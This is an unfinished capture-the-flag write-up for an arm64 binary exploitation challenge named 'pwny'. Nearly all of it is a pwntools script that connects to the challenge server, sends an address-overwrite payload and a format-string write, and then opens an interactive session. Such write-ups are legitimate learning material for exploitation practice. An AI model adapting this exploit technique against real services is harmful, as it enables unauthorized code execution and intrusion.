# pwny

## problem

Is this the pwn challenge we've all been waiting for?

- [chal](./chal)

## solution

first off, this is aarch64/arm64 pwn

todo: finish this writeup

```py
from pwn import *

context.arch = 'arm64'

context.bits = 64
context.endian = 'little'

p = remote("155.248.203.119", 42051)

p.sendline(p32(0x41105c) + b'\x00\x00\x00\x00' + cyclic(56) + p32(0x411058) + b'\x00\x00\x00\x00' + p64(0x4007ec))
p.sendline(b"%10$n%201527x%8$n")

p.interactive()
```
